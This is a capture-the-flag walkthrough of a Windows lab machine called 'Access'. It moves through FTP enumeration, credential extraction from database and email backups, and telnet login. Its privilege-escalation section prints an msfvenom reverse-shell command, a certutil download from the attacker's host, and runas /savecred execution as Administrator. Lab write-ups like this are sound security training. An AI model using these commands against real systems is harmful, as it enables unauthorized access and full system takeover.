

## About

Access is an &quot;easy&quot; difficulty machine, that highlights how machines associated with the physical security of an environment may not themselves be secure. Also highlighted is how accessible FTP/file shares can often lead to getting a foothold or lateral movement. It teaches techniques for identifying and exploiting saved credentials.

## Nmap

```
nmap -sC -sV -T5 -v -p- 10.129.53.91
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 425 Cannot open data connection.
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: MegaCorp
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
```


## Port 80

Main website page

![](pics/Pasted%20image%2020260903161845.png)

Try fuzzing

```
ffuf -u http://10.129.53.99/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt -c 
```

![](pics/Pasted%20image%2020260903161926.png)

Found nothing, 

## FTP

Since `Anonymous FTP login allowed (FTP code 230)`.

```
ftp anonymous@10.129.53.91
<Enter> for password
```

![](pics/Pasted%20image%2020260903144744.png)

### Directories

```
08-23-18  09:16PM       <DIR>          Backups
08-24-18  10:00PM       <DIR>          Engineer
```

![](pics/Pasted%20image%2020260903144907.png)
### Files

```
08-24-18  01:16AM                10870 Access Control.zip <- inside Engineer
08-23-18  09:16PM              5652480 backup.mdb <- inside backup
```

### backup.mdb

Trying to identify this file

```
head backup.mdb -n 4
```

![](pics/Pasted%20image%2020260903145929.png)

Searched for the file header. Basically it is a legacy DB file used by windows

![](pics/Pasted%20image%2020260903150151.png)

I used a tool called `mdb-tools` to access the file

```
mdb-tables -1 backup.mdb
```

![](pics/Pasted%20image%2020260903150941.png)

Got this error. So to be sure I back traced my steps and performed a sanity check to make sure that the downloaded file is not the  problem since there was this warning

```
WARNING! 28296 bare linefeeds received in ASCII mode.
File may not have transferred correctly.
```

I changed the ftp mode to binary using the command `bin`. Then downloaded the files again.

![](pics/Pasted%20image%2020260903160112.png)

Now lets try the process again

![](pics/Pasted%20image%2020260903160300.png)

So that was the problem indeed. Now I will transfer the file to my windows box to get better visability

#### Inspecting the DB file

While looking for leaked info, I found this table

![](pics/Pasted%20image%2020260903160652.png)

Leaked creds

```
admin:admin
engineer:access4u@security
backup_admin:admin
```

Users list

![](pics/Pasted%20image%2020260903161337.png)

```
name
John
Mark
Sunita
Mary
Monica
```

### Access Control.zip

The `zip` file is password protected 

![](pics/Pasted%20image%2020260903162908.png)

I tried cracking it using hashcat

```
zip2hashcat Access\ Control.zip > zip_hash.cat
```

![](pics/Pasted%20image%2020260903163046.png)

```
hashcat zip_hash.cat /usr/share/wordlists/rockyou.txt
```

But failed to brute force, but after I got the engineer password I tried again.

```
engineer:access4u@security
```

![](pics/Pasted%20image%2020260903163510.png)

After I extracted the `pst` file, Found a `pst` file opener to read the email template .
(you can use a online pst viewer but I do not recommend it, in client pentest because you never know what they do with the data, for CTF its fine.)

```
Hi there,

The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.

Regards,

John
```

Leaked creds from John to engineering department thru email, Nice!
```
security:4Cc3ssC0ntr0ller
```



## Telnet

Tried login with anonymous and guest but non are allowed

![](pics/Pasted%20image%2020260903152458.png)

After I opened the `mdb` file I can try the leaked creds I found.

```
admin:admin // failed
backup_admin:admin // failed
engineer:access4u@security // access denied
```

![](pics/Pasted%20image%2020260903161033.png)

Now After I got another creds for the `security` account lets try it.
```
security:4Cc3ssC0ntr0ller
```

Command I used

```
telnet 10.129.53.99 
```

![](pics/Pasted%20image%2020260903164400.png)

## Flag 1

![](pics/Pasted%20image%2020260903164502.png)

## PrivEsc


### YamCam

First I took a look into the `.yamcam` file because it is not familiar to me

![](pics/Pasted%20image%2020260903164640.png)

Found an IP

![](pics/Pasted%20image%2020260903164853.png)

```
<string>176.26.141.32</string>
```

It is basically a video surveillance software. I found an exploit on the program website about Arbitrary File Access which is not relevant in this context.

### ZKAccess3.5

Found another weird directrory

![](pics/Pasted%20image%2020260903165159.png)

Inside that I found a program called `ZKAccess3.5`

![](pics/Pasted%20image%2020260903165728.png)

Fingerprinted the exact version `ZKAccess3.5.3`

![](pics/Pasted%20image%2020260903165634.png)

Lets look for vulnerability for this exact version

![](pics/Pasted%20image%2020260903165822.png)

That is exactly what we need. Lets see the permissions that `sdada` have

```
icacls ZKAccess3.5
ZKAccess3.5 NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
			BUILTIN\Administrators:(I)(OI)(CI)(F)
			BUILTIN\Users:(I)(OI)(CI)(RX)
			BUILTIN\Users:(I)(CI)(AD)
			BUILTIN\Users:(I)(CI)(WD)
			CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

![](pics/Pasted%20image%2020260903170416.png)

After reading the description I knew this is not vulnerable because the `M` flag is not set. So this is not useful too.

After more local enumeration on the machine found this link file

![](pics/Pasted%20image%2020260903184945.png)

Taking a look at the contents of the link file

![](pics/Pasted%20image%2020260903185024.png)

I saw this `/savecred` flag passed with the `runas` command

```
runas.exeC:\ZKTeco\ZKAccess3.5G/user:ACCESS\Administrator /savecred <command>
```

This allow us to execute any executable as the Administrator. To enumerate the stored creds on the cmd use this command

```
cmdkey /list
```

![](pics/Pasted%20image%2020260903185303.png)

Created the malicious file via `msfvenom`

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.82 LPORT=9911 -f exe -o Access.exe
```

![](pics/Pasted%20image%2020260903171014.png)

Legacy system download file command
```
certutil -urlcache -split -f "http://10.10.14.82:8000/Access.exe" "Access.exe"
```

Now lets execute using the runas command with the stored creds of the `Administrator`.

```
runas /savecred /user:ACCESS\Administrator "c:\Users\Public\Access.exe"
```

![](pics/Pasted%20image%2020260903185621.png)

Got a shell as the administrator

![](pics/Pasted%20image%2020260903185633.png)
## Flag 2

![](pics/Pasted%20image%2020260903185738.png)

Done.

![](pics/Pasted%20image%2020260903185716.png)


